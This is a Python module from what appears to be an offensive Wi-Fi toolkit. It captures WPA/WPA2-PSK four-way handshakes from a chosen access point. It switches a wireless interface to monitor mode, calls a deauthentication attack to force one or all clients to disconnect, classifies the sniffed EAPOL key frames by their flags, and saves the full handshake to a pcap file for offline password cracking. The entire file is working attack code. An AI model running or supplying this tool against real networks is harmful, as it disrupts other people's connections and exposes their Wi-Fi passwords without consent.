import argparse

from pathlib2 import Path
from pony.orm import *
from pyric import pyw
from scapy.all import *

from pinecone.core.database import BasicServiceSet, ExtendedServiceSet, Client
from pinecone.core.script import BaseScript
from pinecone.utils.interface import set_monitor_mode
from pinecone.utils.packet import is_multicast_mac, compare_macs, BROADCAST_MAC, get_dot11_addrs_info, WPA_key, \
    get_flags_set
from pinecone.utils.template import to_args_str


class Module(BaseScript):
    META = {
        "id": "scripts/attack/wpa_handshake",
        "name": "WPA handshake capture script",
        "author": "Valentín Blanco (https://github.com/valenbg1/)",
        "version": "1.0.0",
        "description": "Captures WPA handshakes by deauthenticating clients and then sniffing for the handshake.",
        "options": argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter),
        "depends": {"attack/deauth"}
    }
    META["options"].add_argument("-i", "--iface", help="monitor mode capable WLAN interface.", default="wlan0")
    META["options"].add_argument("-b", "--bssid", help="BSSID of target AP")
    META["options"].add_argument("-s", "--ssid", help="SSID of target AP")
    META["options"].add_argument("-c", "--client", help="MAC of target client", default=BROADCAST_MAC)
    META["options"].add_argument("--channel", help="channel of target AP", type=int)
    META["options"].add_argument("--no-deauth", help="do not deauth client(s) from AP", action="store_true")
    META["options"].add_argument("--sniff-time", help="time (in seconds) that the interface will be monitoring",
                                 default=10, type=int)

    START_SCRIPT_TEMPLATE_PATH = Path(Path(__file__).parent, "start_wpa_handshake_template").resolve()  # type: Path
    START_SCRIPT_FILENAME = "start_wpa_handshake_script"

    def __init__(self):
        self.handshakes_cache = None
        self.args = None
        self.cmd = None

        super().__init__()

    @db_session
    def run(self, args, cmd):
        bss = None
        ess = None
        client = None

        if args.ssid is not None:
            ess = ExtendedServiceSet.get(ssid=args.ssid)

        args.all_clients = compare_macs(args.client, BROADCAST_MAC)
        if not is_multicast_mac(args.client):
            client = Client.get(mac=args.client)

        if args.bssid is None and ess is not None and not ess.bssets.is_empty():
            if ess.bssets.count() == 1:
                args.bssid = ess.bssets.select().first().bssid
            else:
                cmd.pfeedback('SSID "{}" is associated with multiple BSSIDs, select the appropiate:'.format(ess.ssid))
                args.bssid = cmd.select(sorted(bss.bssid for bss in ess.bssets), "Option: ")

        if args.bssid is None and client is not None and not client.connections.is_empty():
            if client.connections.count() == 1:
                args.bssid = client.connections.select().first().bss.bssid
            else:
                cmd.pfeedback("Client {} is associated with multiple BSSIDs, select the appropiate:".format(client.mac))
                args.bssid = cmd.select(sorted(conn.bss.bssid for conn in client.connections), "Option: ")

        if args.bssid is not None:
            bss = BasicServiceSet.get(bssid=args.bssid)

        if args.channel is None and bss is not None:
            args.channel = bss.channel

        if args.bssid is None:
            cmd.perror("BSSID is missing.")
        elif args.channel is None:
            cmd.perror("Channel is missing.")
        elif bss is not None and not ("WPA" in bss.encryption_types and "PSK" in bss.authn_types):
            cmd.perror("AP encryption mode is not WPA[2]-PSK.")
        else:
            interface = set_monitor_mode(args.iface)
            pyw.chset(interface, args.channel)
            self.handshakes_cache = {}
            self.args = args
            self.cmd = cmd

            if not args.no_deauth:
                script_args = argparse.Namespace()
                script_args.deauth_args = to_args_str({
                    "iface": args.iface,
                    "bssid": args.bssid,
                    "channel": args.channel,
                    "client": args.client
                    # "num-packets": 10
                })

                if args.all_clients:
                    cmd.pfeedback(
                        "[i] Deauthenticating all clients from AP {} on channel {}...".format(args.bssid, args.channel))
                else:
                    cmd.pfeedback(
                        "[i] Deauthenticating client {} from AP {} on channel {}...".format(args.client, args.bssid,
                                                                                            args.channel))
                super().run(script_args, cmd)
            else:
                cmd.pfeedback("[i] Disabled client deauthentication.")

            if args.all_clients:
                cmd.pfeedback(
                    "[i] Monitoring for {} secs on channel {} for WPA handshakes between all clients and AP {}...".format(
                        args.sniff_time, args.channel, args.bssid))
            else:
                cmd.pfeedback(
                    "[i] Monitoring for {} secs on channel {} for WPA handshakes between client {} and AP {}...".format(
                        args.sniff_time, args.channel, args.client, args.bssid))
            sniff(iface=args.iface, prn=self.handle_eapol_packet, timeout=args.sniff_time, store=False)

    def handle_eapol_packet(self, packet: Packet) -> None:
        if packet.haslayer(WPA_key):
            dot11_addrs_info = get_dot11_addrs_info(packet)
            dot11_ds_bits = dot11_addrs_info["ds_bits"]

            if len(dot11_ds_bits) == 1:  # to-DS or from-DS
                bssid = dot11_addrs_info["bssid"]
                client_mac = dot11_addrs_info["sa"] if "to-DS" in dot11_ds_bits else dot11_addrs_info["da"]

                if bssid == self.args.bssid and (self.args.all_clients or compare_macs(self.args.client, client_mac)):
                    if client_mac not in self.handshakes_cache:
                        self.handshakes_cache[client_mac] = [None, None, None, None]

                    wpa_key_packet = packet[WPA_key]

                    if wpa_key_packet.sprintf("%key_info_type%") == "pairwise":
                        key_info_flags = get_flags_set(wpa_key_packet.key_info_flags)
                        frame_number = None

                        # Frame 1: not install, ACK, not MIC.
                        if "install" not in key_info_flags and "ACK" in key_info_flags and "MIC" not in key_info_flags:
                            frame_number = 0
                        elif "install" not in key_info_flags and "ACK" not in key_info_flags and "MIC" in key_info_flags:
                            # Frame 4: not install, not ACK, MIC, nonce == 0.
                            if all(n == 0 for n in wpa_key_packet.nonce):
                                frame_number = 3
                            # Frame 2: not install, not ACK, MIC, nonce != 0.
                            else:
                                frame_number = 1
                        # Frame 3: install, ACK, MIC.
                        elif "install" in key_info_flags and "ACK" in key_info_flags and "MIC" in key_info_flags:
                            frame_number = 2

                        if frame_number is not None:
                            self.cmd.pfeedback(
                                "[i] Captured handshake frame #{} for client {}.".format(frame_number + 1, client_mac))
                            self.handshakes_cache[client_mac][frame_number] = packet

                        if all(p is not None for p in self.handshakes_cache[client_mac]):
                            self.cmd.pfeedback(
                                "[i] Captured complete WPA 4-way handshake for client {}.".format(client_mac))

                            # TODO
                            wrpcap("tmp/handshake.pcap", self.handshakes_cache[client_mac])

    def stop(self, cmd):
        pass
